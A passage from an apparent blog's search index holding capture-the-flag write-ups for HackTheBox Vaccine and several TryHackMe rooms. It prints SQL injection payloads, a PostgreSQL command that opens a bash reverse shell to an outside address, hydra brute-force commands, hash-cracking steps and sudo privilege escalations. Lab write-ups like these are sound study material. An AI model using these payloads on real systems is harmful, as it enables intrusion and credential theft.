Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Finding Columns with useful data Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data. Now, we just found 5 columns The next payload gonna be using UNION SELECT Place string into each column. This is what I’m gonna try: ' UNION SELECT 'a',NULL,NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,NULL,'a'-- Well, we’ve found an error at the first column that state: ERROR: invalid input syntax for integer: \"a\" LINE 1: ...ect \\* from cars where name ilike '%' UNION SELECT 'a',NULL,N... If the data type of a column is not compatible with string data, the injected query will cause a database error, such as: Conversion failed when converting the varchar value 'a' to data type int. The rest of it. Work Fine ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:4:5","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Foothold/Gaining Access ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:5:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"The Version of database Let’s get the database version by inserting this in search field: ' UNION SELECT NULL,VERSION(),NULL,NULL,NULL-- The result ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:5:1","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Exploit I found this article Authenticated Arbitrary Command Execution on PostgreSQL 9.3 \u003e Latest Let’s try exploit it. by inserting this: ';DROP TABLE IF EXISTS cmd_exec;-- ';CREATE TABLE cmd_exec(cmd_output text);-- ';COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.16.86/9901 0\u003e\u00261\";'-- ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:6:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Reverse Shell Got the reverse shell Found ssh key ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:7:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"SSH Copy the key and change the permission with chmod 600 ssh into it Let’s take a look at the website folder /var/www/html we’ve found a lot of files First, lets check if there any user on it by using grep Found 2 user exist: admin postgres However, postgres user have it’s own password. Now, we’ve got the password. Let’s try check the sudo permission on it by typing sudo -l ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:8:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Privilege Escalation Interesting, this user can run vi as sudo on specific file Let’s execute it by open the file with full path sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf now, press esc and type :!/bin/sh press return Source - sudo vi GTFOBins ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:9:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Root Now, I’m root Found the root flag ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:9:1","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. Make sure to configure the database properly and please update it. Use, long and complicate passwords. DO NOT mix around with the user command and the root command. I have a fun time doing this machine and I hope you guys do too. Bye ;) ","date":"21-07-2021","objectID":"/posts/htb/vaccine/:10:0","tags":["sqlmap","sql-union","GTFOBins"],"title":"HackTheBox - Vaccine Writeup","uri":"/posts/htb/vaccine/"},{"categories":null,"content":"Link : https://tryhackme.com/room/agentsudoctf ","date":"10-07-2021","objectID":"/posts/thm/agent_sudo/:0:0","tags":["stegseek","CVE-2019-14287"],"title":"TryHackMe - Agent Sudo Writeup","uri":"/posts/thm/agent_sudo/"},{"categories":null,"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/agent_sudo/:1:0","tags":["stegseek","CVE-2019-14287"],"title":"TryHackMe - Agent Sudo Writeup","uri":"/posts/thm/agent_sudo/"},{"categories":null,"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format # Nmap 7.91 scan initiated Fri May 7 17:41:26 2021 as: nmap -sC -sV -oN nmap/initial 10.10.240.194 Nmap scan report for 10.10.240.194 Host is up (0.67s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Annoucement Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri May 7 17:41:48 2021 -- 1 IP address (1 host up) scanned in 21.32 seconds The scan result shows us. There are 3 open ports. Let’s start enumerating them. 21 / ftp 22 / ssh 80 / http Looks like this machine has a webpage on port 80 running on apache. Let’s take a look Hmmmmm… It’s says something about user-agent and I’m not find anything in the source code. Codename? it sounds fun yet confusing. So, like any mad man will do. I’ll try to change the user-agent into anything from windows to android but nothing really weird happens. Turn’s out, the hint sitting in front of me the entire time… ARRRRGGGG!!! So, this message is from agent R if you look closer. Not the monitor tho. DAA!!. The agent is using the codename with the uppercase letter. I’m gonna assume this agent also use uppercase letter but which one? The alphabets contain 26 letters NOTE: English alphabets have 26 letters, OK! are you happy now! jk :) ","date":"10-07-2021","objectID":"/posts/thm/agent_sudo/:1:1","tags":["stegseek","CVE-2019-14287"],"title":"TryHackMe - Agent Sudo Writeup","uri":"/posts/thm/agent_sudo/"},{"categories":null,"content":"Python Script python script for brute-forcing user-agent. I’m gonna brute-force with uppercase letters. #!/usr/bin/python3 import requests import string for line in string.ascii_uppercase: url = \"http://10.10.30.160\" headers = {'User-Agent':f'{line}'} response = (url, headers=headers) print(f\"{len(response.content)} {line}\") Finally, we got hit for letter C. Let’s gooo baby! yes. I’m excited ➜ Agent_Sudo python3 brute.py 218 A 218 B 177 C 218 D 218 E 218 F 218 G 218 H Let’s edit our user-agent into “C”. I’m gonna use the dev-tools built-in function in the browser to access it press f12 and go to network click reload. NOTE: I’m using firefox in this case Then, click the one on the list. Right-click and Edit and Resend, make sure to edit the user-agent into “C”. After, all done click Send After, you click send. We’ve found something new in there. Something like this Let’s navigate to that page. It looks like we’ve got a new message and a new user. It’s says something about a weak password. So, I’m gonna assume we can brute-force ssh with that username or brute-force FTP with that username. First, let’s try with FTP. Now, let’s try brute-force it using hydra. ➜ Agent_Sudo hydra ftp://10.10.30.160 -l \"chris\" -P /opt/rockyou.txt -vV Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-07 19:02:03 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task [DATA] attacking ftp://10.10.30.160:21/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [ATTEMPT] target 10.10.30.160 - login \"chris\" - pass \"123456\" - 1 of 14344401 [child 0] (0/0) ---[snip]--- [ATTEMPT] target 10.10.30.160 - login \"chris\" - pass \"censored\" - 256 of 14344401 [child 15] (0/0) [21][ftp] host: 10.10.30.160 login: \"chris\" password: \"xxxxxxxx\" [STATUS] attack finished for 10.10.30.160 (waiting for children to complete tests) 1 of 1 target successfully completed, 1 valid password found YES! we found the password. Now, let’s try to login in. SUCCESS. So, let’s download all the files in that into our machine using the mget command We have all the files in here. Let’s take a look one by one. First, let’s start with the text file That’s so interesting message and it sounds like steganography to me. Now, I’m gonna crack one of the image file using stegseek. NOTE: stegseek only works on the jpg file. wow! these tools so amazing it is super fast. Anyways, we found the password. Also, we got a file. Let’s cat the content of it. That’s true. So, cheesy but look at the bright side. We’ve just got a password and a new user. So, I’m gonna assume this is for ssh but before we try it. I’m curious about the png file. The question wants a zip file password but still, we don’t have or found any zip file yet. So, I’m gonna extract files from png image using cyberchef. Wow, it unbelievable we found the zip file in it let’s download it. This is personal to me. The first thing, I’m gonna do is change the file name. It is too longggggg. :) Unfortunately, we can’t extract the file because it’s password protected. Anyways, let’s crack this zip file using john the ripper [JtR]. First, we need to convert the file to make sure [JtR] would understand it. I’m gonna use zip2john and then I’m using John-The-Ripper to crack it. Here the image of it. Let’s read the file content. We’ve found something encrypted. It looks like base64 and we got it. It is base64 but is this something useful?. We still don’t know yet but let’s go to the main event ssh. ","date":"10-07-2021","objectID":"/posts/thm/agent_sudo/:1:2","tags":["stegseek","CVE-2019-14287"],"title":"TryHackMe - Agent Sudo Writeup","uri":"/posts/thm/agent_sudo/"},{"categories":null,"content":"Foothold/Gaining Access Let’s ssh with that creds and see what’s happening next. WOW! I’m in. YES!, we found the user flag. Also, we found another image file let’s try to download it into our machine. Using scp command ","date":"10-07-2021","objectID":"/posts/thm/agent_sudo/:2:0","tags":["stegseek","CVE-2019-14287"],"title":"TryHackMe - Agent Sudo Writeup","uri":"/posts/thm/agent_sudo/"},{"categories":null,"content":"Privilege Escalation Now, we’ve got the file on our machine. Anyways, Let’s enumerate this machine more. First, I’m gonna use the sudo -l command to see anything that super interesting. Wow! I’ve found the interesting thing. I have seen this before but I forgot what the cve of this sudo. I’ll try google it and found it. CVE-2019–14287 . Let’s become root. MUAHAHAHAHAH We’ve found the final flag and we’ve become root. ","date":"10-07-2021","objectID":"/posts/thm/agent_sudo/:3:0","tags":["stegseek","CVE-2019-14287"],"title":"TryHackMe - Agent Sudo Writeup","uri":"/posts/thm/agent_sudo/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. First, do not make your password too short or too simple and the important thing make sure don’t put any sensitive data on public and non-secure platforms. Always, update your system. We can see in this room we become root using the CVE. Please update your system. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/agent_sudo/:4:0","tags":["stegseek","CVE-2019-14287"],"title":"TryHackMe - Agent Sudo Writeup","uri":"/posts/thm/agent_sudo/"},{"categories":null,"content":"Link : https://tryhackme.com/room/bsidesgtanonforce ","date":"10-07-2021","objectID":"/posts/thm/anonforce/:0:0","tags":["ftp"],"title":"TryHackMe - Anonforce Writeup","uri":"/posts/thm/anonforce/"},{"categories":null,"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/anonforce/:1:0","tags":["ftp"],"title":"TryHackMe - Anonforce Writeup","uri":"/posts/thm/anonforce/"},{"categories":null,"content":"Explaining the nmap flag: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format Nmap scan is done. Let’s take a look at that result. We can see that this machine has 2 ports open and we can log in as anonymous in port 21/FTP. Well, we can access the FTP with anonymous login. Let’s enumerate this service first because we all know that SSH must have a password to access it. WOW! we found the melodias home directory and he got the user flag. However, we cannot read the content of the file in this protocol. So, I’m gonna download that file using the get command. After download it, just cat the file and you found the first flag. If you navigate the starting point of this directory/file system. It seems a little odd. You can see one of the folders is not supposed to be there/exists. The folder is called notread. Let’s try to investigate that folder I didn’t expect that. We found 2 files. It seems to encrypt with gpg stuff and private key?. COOL! Let’s download it first. ","date":"10-07-2021","objectID":"/posts/thm/anonforce/:1:1","tags":["ftp"],"title":"TryHackMe - Anonforce Writeup","uri":"/posts/thm/anonforce/"},{"categories":null,"content":"Foothold/Gaining Access Now, we have the private key. The format of the key looks like gpg encryption. So, I’m gonna use a tool called John the Ripper [JtR] to crack it. Unfortunately, [JtR] did not understand that. First, we need to convert that encryption into [JtR] would understand using gpg2john. Now, we need to run the [JtR] to crack the hash. Looks like [JtR] has found the password already. First, you need to import the key into the private_key file to validate. Then, just decrypt the backup.pgp into crack.txt file. When I’ve read the content of the file. I’m shocked! We’re all can see the root password hash exists in this file. Let’s try to crack it using hashcat. Now, you need to save the hash into a file. In this case, I’m gonna save this hash into a file called root.hash . Now, let’s run the hashcat. YES!!! we’ve found the root password. However, we can’t change the user in FTP. Now, that leaves us with one choice. The SSH. Let’s try SSH into that machine using root as username and the password we’ve crack as SSH password. It’s work. Now, let’s try to find the root flag. YES!! WE’VE FOUND IT ","date":"10-07-2021","objectID":"/posts/thm/anonforce/:2:0","tags":["ftp"],"title":"TryHackMe - Anonforce Writeup","uri":"/posts/thm/anonforce/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. Never give anonymous access to your FTP [File Transfer Protocol]. After that, make sure you’re using the longest and strongest password ever. If you can see above, [JtR] and hashcat can crack the hash very easily. However, please don’t put anything and any sensitive information on there. Anyways, I’ve learned how to use the gpg command and I’m excited. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/anonforce/:3:0","tags":["ftp"],"title":"TryHackMe - Anonforce Writeup","uri":"/posts/thm/anonforce/"},{"categories":null,"content":"Link : https://tryhackme.com/room/cowboyhacker ","date":"10-07-2021","objectID":"/posts/thm/bounty_hacker/:0:0","tags":["GTFOBins","hydra","ssh"],"title":"TryHackMe - Bounty Hacker Writeup","uri":"/posts/thm/bounty_hacker/"},{"categories":null,"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/bounty_hacker/:1:0","tags":["GTFOBins","hydra","ssh"],"title":"TryHackMe - Bounty Hacker Writeup","uri":"/posts/thm/bounty_hacker/"},{"categories":null,"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format Now, the Nmap scan it’s done. We have 3 open ports FTP, ssh, and HTTP. In this scan, Nmap says FTP can log in as anonymous. Let’s try it wow! it is working. Now, let’s play around with this and try to find the interesting file. OK. I just found 2 files in this thing. So, I’m gonna use the gets command to download that file into my machine. Let’s check that file out. locks.txt task.txt The file called locks.txt look like wordlist and we’ve got a potential user in the task.txt Now, we just have one port to go. It is port 80. Now, let’s do enumeration against this website However, I can’t find anything useful. So, I’m gonna run the tool called gobuster to find the hidden directory on this website. Unfortunately, I still can’t find anything. ","date":"10-07-2021","objectID":"/posts/thm/bounty_hacker/:1:1","tags":["GTFOBins","hydra","ssh"],"title":"TryHackMe - Bounty Hacker Writeup","uri":"/posts/thm/bounty_hacker/"},{"categories":null,"content":"Foothold/Gaining Access This leaves me with the 2 files from FTP earlier. Now, let’s try brute force ssh with these credentials. I’m gonna use hydra for this hydra -l \u003cusername\u003e -P \u003cpassword-list\u003e ssh://\u003cmachine ip\u003e In this case, I’m gonna use locks.txt as password list and user that I found in the task.txt file. We’ve got a hit. Let’s access the machine now. Yes! we finally gain a foothold on this machine. Now, let’s get our user flag. ","date":"10-07-2021","objectID":"/posts/thm/bounty_hacker/:2:0","tags":["GTFOBins","hydra","ssh"],"title":"TryHackMe - Bounty Hacker Writeup","uri":"/posts/thm/bounty_hacker/"},{"categories":null,"content":"Privilege Escalation Now, we need to do the basic enumeration. First, I’m gonna check user sudo permission/capability As we see, this user can run tar as root. Let’s try to find an exploit. I’m gonna search for that on the famous website called GTFOBins. Now let’s copy and paste it into our victim machine. wow! we just became root just like that. Let’s find the root flag. ","date":"10-07-2021","objectID":"/posts/thm/bounty_hacker/:3:0","tags":["GTFOBins","hydra","ssh"],"title":"TryHackMe - Bounty Hacker Writeup","uri":"/posts/thm/bounty_hacker/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. The tool called hydra can brute force the ssh [Secure Shell] with ease. Do not allow anonymous login out in the open. It’s so dangerous. Even the Nmap can found that. Lastly, just don’t mix up command with user and root. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/bounty_hacker/:4:0","tags":["GTFOBins","hydra","ssh"],"title":"TryHackMe - Bounty Hacker Writeup","uri":"/posts/thm/bounty_hacker/"},{"categories":null,"content":"Link : https://tryhackme.com/room/brooklynninenine ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:0:0","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"[The First Method] ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:1:0","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:1:1","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format Nmap scan shows us there is 3 port open. Ports SSH, HTTP, and FTP. I’m interested in the FTP port. You can see, FTP in this machine allows anonymous login. So, let’s try to check it out. ftp \u003cmachine ip\u003e wow! it is working. We can see the note_to_jake.txt file in there. Now, I’m gonna run the get command to download that file into my machine. Let’s see what’s the content of this file. We know that the jake user has a password problem. In this case, we kinda have a potential user at this point. So, I’m gonna try to SSH brute-force with hydra. Remember! the jake user has a password problem. It worth taking a look at. hydra ssh://10.10.129.196 -l jake -P /path/to/wordlist.txt ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:1:2","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Foothold/Gaining Access Let’s try login as jake with that credentials. Yes! We, finally login. First, I’m run the ls -la command to list all/hidden in the current directory. To be honest, I’m shocked because I can’t find the user flag. Now, I’m gonna list the /home directory to make sure how many users exist on this machine. Finally, I’m found the user flag. ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:1:3","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Privilege Escalation First, what I like to do is run the sudo -l command to check sudo permission/capability. OK! that’s dope. This user can run the less command with sudo. I’m gonna search less exploit to privilege escalation on this site GTFOBins. Let’s become root now!. happy face This is the end of 1st method. Let’s try another method ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:1:4","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"[The Second Method] ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:2:0","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:2:1","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format Nmap scan shows us there is 3 port open. Ports SSH, HTTP, and FTP. I’m interested in the FTP port. You can see, FTP in this machine allows anonymous login. So, let’s try to check it out. ftp \u003cmachine ip\u003e wow! it is working. We can see the note_to_jake.txt file in there. Now, I’m gonna run the get command to download that file into my machine. Let’s see what’s the content of this file. Now, we got a lot of potential users here. Anyways, We can see the Nmap result shows us this machine have port 80 running HTTP. Let’s take a look. This is the very first thing I’m gonna do. You always need to check the page source code maybe we can find something interesting. Well, yes we did. That’s weird. We can see the comment says ‘Have you ever heard of steganography?’. Let’s try to find out what is steganography. So, I’m gonna download this image and try to crack it. First, I’ll try running info using a tool called steghide. Unfortunately, this image is password protected. However, we have a tool to crack it. This tool is called stegseek. WOW!!! we succeed to crack it. stegseek -sf \u003cimg.jpg\u003e -wl /path/to/wordlist.txt We can see, it says extracting to brooklyn99.jpg.out. Now, let’s read the file content. ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:2:2","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Foothold/Gaining Access That wasn’t expecting at all. We’ve just found the holt user password. Well, let’s try login into SSH with those credentials. FINALLY!!!!! WE’RE IN. ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:2:3","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Privilege Escalation First, what I like to do is run the sudo -l command to check sudo permission/capability. Again. Let’s check out any sudo nano exploit in GTFOBins First, open the nano text editor. Then, you need to go to the ‘Read File’ command and the ‘Execute command’. However, in this case, I’m not gonna run the command provide by GTFOBins because it’s crash my shell. Anyways, I’m gonna set /bin/bash as SUID. open the nano text editor press the Ctrl+R press the Ctrl+X set the /bin/bash as SUID After done set the /bin/bash just press Enter and exit out of nano Ctrl+X. Now, run this command /bin/bash -p we’re now root. This is the end of 2 method. I hope you enjoy this room as I did. Well, bye2. ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:2:4","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. First, do not ever make FTP can log in as anonymous and do not ever put any sensitive data/file in it. Make sure your account is protected by a strong, long, and complicated password. Before I forgot, configure the sudo command properly because that’s an OP command. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/brooklyn_99/:3:0","tags":["stegseek","GTFOBins","hydra"],"title":"TryHackMe - Brooklyn99 Writeup","uri":"/posts/thm/brooklyn_99/"},{"categories":null,"content":"Link : https://tryhackme.com/room/bruteit ","date":"10-07-2021","objectID":"/posts/thm/brute_it/:0:0","tags":["john","hashcat"],"title":"TryHackMe - Brute It Writeup","uri":"/posts/thm/brute_it/"},{"categories":null,"content":"Enumeration First we need to connect to try hack me networks through openvpn and deploy the machine. Now, the box is up. First, we need to do a reconnaissance using nmap. Nmap is a network mapper tool for scanning the ports or enumerate the machine through ports. I will run this command for my nmap scan. nmap -sC -sV -O -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/brute_it/:1:0","tags":["john","hashcat"],"title":"TryHackMe - Brute It Writeup","uri":"/posts/thm/brute_it/"},{"categories":null,"content":"Explaining the nmap flag: -sC := scan using nmap default script -sV := scan for version -O := scan for OS [operating system] -oN := output in normal format Now our nmap scan is done. We can the result here that this machine has 2 ports open. Port 22 and 80. Port 80 is running on apache webserver on ubuntu box. We also can see the version of ssh and apache. This machine have webserver in port 80. So, let’s take a look Well, port 80 it’s just lead me to the apache default page and I don’t have a lot of information by just looking into that page.However, we can find hidden directory using tool called gobuster. I’m gonna run this command: gobuster dir -u http://\u003cmachine ip\u003e -w \u003cpath/to/wordlist\u003e — no-error ","date":"10-07-2021","objectID":"/posts/thm/brute_it/:1:1","tags":["john","hashcat"],"title":"TryHackMe - Brute It Writeup","uri":"/posts/thm/brute_it/"},{"categories":null,"content":"Explaining gobuster flag: dir := using directory mode -u := specify url -w := specify wordlist — no-error := no error After we ran it. We found the hidden directory called /admin. Let’s go to that page and take a look Interesting, this page is the login page but how to login because we don’t have any credentials yet. We can view the source code of this page to find any interesting function or maybe a comment. WOW! we can see the comment that says ‘Hey john if you don’t remember, the username is admin’. Right now, we have a potential username and user. However, we still don’t have the password. We can try to brute force the password using a tool called hydra. Today, I’m gonna make a python script to brute force this page. Now, let’s run our python script. Unbelievable, our script finally got a hit. Now we have user credentials. Let’s try to login with these credentials and it works. Oh! we’ve got the web flag on this page and we’ve got RSA private key. I’m gonna save that key in a file called id_rsa. Unfortunately, the RSA key is protected by a passphrase and I gonna assumed this is John’s key. Anyways, we can use john the ripper [JtR] to crack this key. First, we gonna use ssh2john to rewrite this key into a format that [JtR] can understand. Now, I’m gonna run this command: python3 ssh2john.py id_rsa \u003e new_id_rsa If we can see. The file called new_id_rsa was been created in our working directory. Now we can use [JtR] to crack the hashes john — wordlist=/opt/rockyou.txt — format=SSH new_id_rsa Let’s go ssh into this machine but first, we need to write our permission on the id_rsa file. chmod 600 id_rsa Let’s ssh into that machine! ","date":"10-07-2021","objectID":"/posts/thm/brute_it/:1:2","tags":["john","hashcat"],"title":"TryHackMe - Brute It Writeup","uri":"/posts/thm/brute_it/"},{"categories":null,"content":"Foothold/Gaining Access ssh -i id_rsa john@\u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/brute_it/:2:0","tags":["john","hashcat"],"title":"TryHackMe - Brute It Writeup","uri":"/posts/thm/brute_it/"},{"categories":null,"content":"Privilege Escalation Now, we need to do the basic enumeration. First, I’m gonna check user sudo permission/capability Cool! this user can run the cat command as root and no password needed. So, we need to read the password hashes and hopefully, we’ve got the root password. Yes! we’ve got the root password but it’s still in hash not in the plaintext. So now, we gonna use a tool called hashcat for this. If we look at this hash it looks like sha512crpyt. First, we need to copy and paste the root hash in the file. Mine called root.hash. So, I’m gonna run the hashcat with mode 1800 and rockyou.txt as my wordlist. And now we just can log in as root. ","date":"10-07-2021","objectID":"/posts/thm/brute_it/:3:0","tags":["john","hashcat"],"title":"TryHackMe - Brute It Writeup","uri":"/posts/thm/brute_it/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. The tool called john the ripper [JtR] and hashcat is good for cracking hashes. On top of that, I finally can use my python knowledge in this room. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/brute_it/:4:0","tags":["john","hashcat"],"title":"TryHackMe - Brute It Writeup","uri":"/posts/thm/brute_it/"},{"categories":null,"content":"Link : https://tryhackme.com/room/bsidesgtdav ","date":"10-07-2021","objectID":"/posts/thm/dav/:0:0","tags":["cadaver","webdav","upload-vuln"],"title":"TryHackMe - DAV Writeup","uri":"/posts/thm/dav/"},{"categories":null,"content":"Enumeration First we need to connect to try hack me networks through openvpn and deploy the machine. Now, the box is up. So, first we need to do a reconnaissance using nmap. Nmap is a network mapper tools for scanning the ports or enumerate the machine through ports. I will run this command for my nmap scan. nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/dav/:1:0","tags":["cadaver","webdav","upload-vuln"],"title":"TryHackMe - DAV Writeup","uri":"/posts/thm/dav/"},{"categories":null,"content":"Explaining the nmap flag: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format The result of our nmap scan We have one port open. Port 80 running on apache webserver version 2.4.18 on ubuntu. Let’s take a look I try read line by line if anything interesting pop up and make sure always read the source code. Just in case Unfortunately, I can’t find anything usefull in this page. Now we gonna use a tools called gobuster. Gobuster a tool for finding the hidden directory on the web. gobuster dir -u http://\u003cmachine ip\u003e -w /opt/directory-medium-list.txt --no-error ","date":"10-07-2021","objectID":"/posts/thm/dav/:1:1","tags":["cadaver","webdav","upload-vuln"],"title":"TryHackMe - DAV Writeup","uri":"/posts/thm/dav/"},{"categories":null,"content":"Explaining the gobuster flag: dir := using directory mode -u := specify url -w := specify wordlist –no-error := no error We found webdav directory. Unfortunately we need username and password to access it. However, I’m gonna try a default webdav creds. YESS IT’S WORKING ","date":"10-07-2021","objectID":"/posts/thm/dav/:1:2","tags":["cadaver","webdav","upload-vuln"],"title":"TryHackMe - DAV Writeup","uri":"/posts/thm/dav/"},{"categories":null,"content":"Foothold/Gaining Access I’m gonna upload my php-reverse-shell using tool called cadaver. Setup a listener. In my case I set the reverse shell for listen to the port 9901. Go to the webpage and double click it. Yes you’ve got a shell Let’s hunt for the user flag. YES! we’ve found it Now, we need to do the basic enumeration. First, I’m gonna check user sudo permission/capability. Turn’s out we can run the cat command with sudo. Let’s cat the root flag out. ","date":"10-07-2021","objectID":"/posts/thm/dav/:2:0","tags":["cadaver","webdav","upload-vuln"],"title":"TryHackMe - DAV Writeup","uri":"/posts/thm/dav/"},{"categories":null,"content":"Conclusion I’ve learn what is the default password of webdav not just that. I’ve learn ‘what is webdav?’. This room is easy and simple but more focusing in webdav. If you using this app, make sure change the password. The longer pass the better. If you see up there. An attacker easily can get on your machine and can do a lot more stuff. Anyways, take care and bye2 ","date":"10-07-2021","objectID":"/posts/thm/dav/:3:0","tags":["cadaver","webdav","upload-vuln"],"title":"TryHackMe - DAV 